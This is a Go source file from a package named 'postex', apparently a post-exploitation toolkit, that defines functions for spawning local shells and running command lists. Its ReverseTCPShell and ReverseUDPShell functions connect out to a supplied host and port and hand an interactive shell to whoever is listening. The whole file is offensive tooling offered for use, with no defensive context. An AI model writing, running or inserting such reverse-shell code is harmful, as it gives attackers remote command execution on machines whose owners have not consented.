package postex
//Contains functions for spawning various different types of shell, local and remote.

import "fmt"
import "os"
import "strings"
import "bytes"
import "time"
import "net"
import "strconv"

/*
* LocalShell(filepath string)
* Spawns a basic local shell connected to STDIN and STDOUT.
*/

func LocalShell(filepath string) {
	//spawn the shell
	var session *shell
	var err error
	session,err = spawnShell(filepath)
	if err != nil {
		fmt.Println("Error initialising.")
		fmt.Println(string(err.Error()))
		return
	}
	session.launch()
	defer session.stop()
	ch := make(chan string, 0)
	//output goroutine
	go func(session *shell, ch chan string) {
		for {
			ch <- session.recv()
		}
	}(session,ch)
	//input loop
	running := true
	for running == true {
		//get input
		msg := make([]byte, 500)
		os.Stdin.Read(msg)
		if strings.HasPrefix(string(msg), "exit") {
			running = false
		}
		//now send the command
		session.send(string(msg) + "\n")
		//collect output
		timeout := 0
		for timeout < 100 {
			select {
				case x := <-ch:
					fmt.Printf(x)
				default:
					time.Sleep(10 * time.Millisecond)
					timeout += 10
			}
		}
	}
}

/* 
* DoCommand(filepath string, commands ...string) string
* Builds on the functionality in LocalShell() to execute a series of commands.
* Returns output as a single string.
*/


func DoCommand(filepath string, commands ...string) string {
	//spawn the shell
	var session *shell
	var err error
	session,err = spawnShell(filepath)
	if err != nil {
		fmt.Println("Error initialising.")
		fmt.Println(string(err.Error()))
		return ""
	}
	session.launch()
	defer session.stop()
	ch := make(chan string, 0)
	//output goroutine
	go func(session *shell, ch chan string) {
		for {
			ch <- session.recv()
		}
	}(session,ch)
	output := bytes.Buffer{}
	//input handling
	for _,command := range commands {
		session.send(command + "\n")
		timeout := 0
		for timeout < 100 {
			select {
				case x := <-ch:
					fmt.Println(x)
					output.WriteString(x)
				default:
					time.Sleep(10 * time.Millisecond)
					timeout += 10
			}
		}
	}
	return output.String()
}

/*
* ReverseTCPShell(filepath string, host string, port int)
*
* Builds on the functionality in LocalShell() to send out an interactive shell via the net package.
*/

func ReverseTCPShell(filepath string, host string, port int) {
	//set up the socket
	addr_string := host + ":" + strconv.Itoa(port)
	target_addr,err := net.ResolveTCPAddr("tcp4", addr_string)
	if err != nil {
		fmt.Println("Error resolving TCP address.")
		fmt.Println(string(err.Error()))
		return
	}
	target_conn,err := net.DialTCP("tcp4", nil, target_addr)
	if err != nil {
		fmt.Println("Error connecting to", addr_string)
		fmt.Println(string(err.Error()))
		return
	}
	defer target_conn.Close()
	//spawn the shell
	session,err := spawnShell(filepath)
	if err != nil {
		fmt.Println("Error initialising.")
		fmt.Println(string(err.Error()))
		return
	}
	session.launch()
	defer session.stop()
	ch := make(chan string, 0)
	//output goroutine
	go func(session *shell, ch chan string) {
		for {
			target_conn.Write([]byte(session.recv()))
		}
	}(session,ch)
	//input loop
	running := true
	for running == true {
		//get input
		msg := make([]byte, 500)
		target_conn.Read(msg)
		if strings.HasPrefix(string(msg), "exit") {
			running = false
		}
		//now send the command
		session.send(string(msg) + "\n")
	}
}

/*
* ReverseUDPShell(filepath string, host string, port int)
*
* Builds on the functionality in LocalShell() to send out an interactive shell via the net package.
*/

func ReverseUDPShell(filepath string, host string, port int) {
	//set up the socket
	addr_string := host + ":" + strconv.Itoa(port)
	target_addr,err := net.ResolveUDPAddr("udp4", addr_string)
	if err != nil {
		fmt.Println("Error resolving UDP address.")
		fmt.Println(string(err.Error()))
		return
	}
	target_conn,err := net.DialUDP("udp4", nil, target_addr)
	if err != nil {
		fmt.Println("Error connecting to", addr_string)
		fmt.Println(string(err.Error()))
		return
	}
	defer target_conn.Close()
	//spawn the shell
	session,err := spawnShell(filepath)
	if err != nil {
		fmt.Println("Error initialising.")
		fmt.Println(string(err.Error()))
		return
	}
	session.launch()
	defer session.stop()
	ch := make(chan string, 0)
	//output goroutine
	go func(session *shell, ch chan string) {
		for {
			target_conn.Write([]byte(session.recv()))
		}
	}(session,ch)
	//input loop
	running := true
	for running == true {
		//get input
		msg := make([]byte, 500)
		target_conn.Read(msg)
		if strings.HasPrefix(string(msg), "exit") {
			running = false
		}
		//now send the command
		session.send(string(msg) + "\n")
	}
}

